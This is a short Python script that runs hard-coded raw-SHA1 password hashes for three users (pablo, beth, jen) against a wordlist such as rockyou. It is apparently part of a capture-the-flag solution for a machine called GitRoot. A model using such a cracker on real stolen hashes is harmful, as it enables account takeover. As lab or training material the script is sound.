#!/usr/bin/env python3
"""Crack the GitRoot raw-SHA1 password hashes against a wordlist (rockyou).

Only pablo's hash is present in rockyou; beth's and jen's passwords are
recovered elsewhere in the chain (git history and jen's .viminfo).

Usage: python3 crack_sha1.py <wordlist>
"""
import hashlib
import sys

TARGETS = {
    "9ebc63a534f8a854941bbbabdf92325fcd2d2e29": "pablo",
    "c6ded2c7fc7281cefb3a2373005d91eb1f32830e": "beth",
    "6930002a9efc93e8bce7bfc48fb09320eb154e4b": "jen",
}


def main():
    wordlist = sys.argv[1] if len(sys.argv) > 1 else "rockyou.txt"
    found = {}
    with open(wordlist, "rb") as fh:
        for line in fh:
            word = line.rstrip(b"\r\n")
            digest = hashlib.sha1(word).hexdigest()
            if digest in TARGETS:
                user = TARGETS[digest]
                found[user] = word.decode(errors="replace")
                print(f"{user} = {found[user]}")
                if len(found) == len(TARGETS):
                    break


if __name__ == "__main__":
    main()
